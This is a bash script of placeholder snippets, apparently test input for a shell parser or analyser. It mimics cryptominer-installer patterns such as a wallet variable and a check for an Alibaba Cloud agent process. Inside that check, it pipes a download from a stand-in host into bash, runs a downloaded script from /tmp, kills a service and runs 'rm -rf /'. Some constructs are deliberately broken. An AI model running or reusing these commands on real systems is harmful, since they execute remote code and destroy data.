#!/bin/bash
rand=$(seq 0 255 | sort -R | head -n1)

if [ $(ping www.google.com >/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
  echo this;
else
  echo that
fi

if cat ~/.judo_config | grep "run"
then
  echo this
fi

USERZ=$(
  echo "root"
  cat ~/.judo_config | grep "run"
)

i=0
((i++))
echo $i

case $sum in
    2 | 3)
        echo "even"
    ;;
    5)
      echo 5;
    ;;
    *)
        echo "odd ?"
    ;;
esac

cat ~/.judo_config | while read judoLine
  do
    echo $judoLine
  done

while read x; do
  echo $x
done < ~/.judo_config;

$[RANDOM%223+1]

a=b
unset a

if [ "$release" == "CentOS" ]; then
  echo "$release 1"
elif [[ "$release" == "Ubuntu" ]] || [[ "$release" == "Debian" ]]; then
  echo "$release 2"
else
  exit 1
fi

if [ "$release" = "CentOS" ]; then
  echo $release
fi

read ~/.judo_config  # Look into the read command

filesize_config=`cat ~/.judo_config | grep run`

value=$(( 3 * 7 / 2 ))

if ! sudo -n true 2>/dev/null; then
  echo this;
done

testing=3
if [ $testing != 106 -a $testing != 95 ]; then
  echo this;
done

[[ $tesing = 3 ]] || (echo "it isn't")

echo ${#WALLET_BASE}
echo ${WALLET_BASE}

echo $((${ssr_port}+0)) &>/dev/null

for((integer = 0; integer <= 100; integer++))
do
  echo this;
done

for((integer = 100; integer >= 1; integer--))
do
  echo this
done

PrintStuff(){
  echo this
}
PrintStuff

bash the-dream.sh 'install'

if ! ( [ -x /usr/local/bin/jj ] || [ -x /usr/bin/jj ] ); then
  echo this
fi

history -n > /dev/null 2>&1

(
  echo "this"
  echo "that"
) >> ~/.judo_config

if ps aux | grep -i '[a]liyun'; then
  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
  pkill this-service
  rm -rf /
  rm -rf /this/that
  systemctl stop named
  apt-get remove this-package
fi

mv /usr/bin/something /usr/bin/else
wget http://www.google.com
a==b; c=d; c="something else";b=something; else=notelse
a=$b; cd $else $b; f=$(cd $b)
$(cp this that)
$(mv over rainbow)
testing=thisaval
testing2=thisaval
testingg=$testinggg
cd /tmp &  cd /var/run &  cd /mnt &  cd /root &  cd /;
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
for i in 1 2 3 4;
do
  for j in 1 2 3 4;
  do 
    echo $i $j;
  done
done
sshports="one, two, three"
for test in $sshports; 
do 
  echo "test: $test"
  for sshp in $sshports; 
  do 
    echo "sshp: $test"
  done
done


if [ -s /usr/bin/ifconfig ];
then
	range=$(ifconfig | grep "this" | head -n1)
else
	range=$(ip a | grep "127.0.0.1" | head -n1)
  echo this 
  echo even more
fi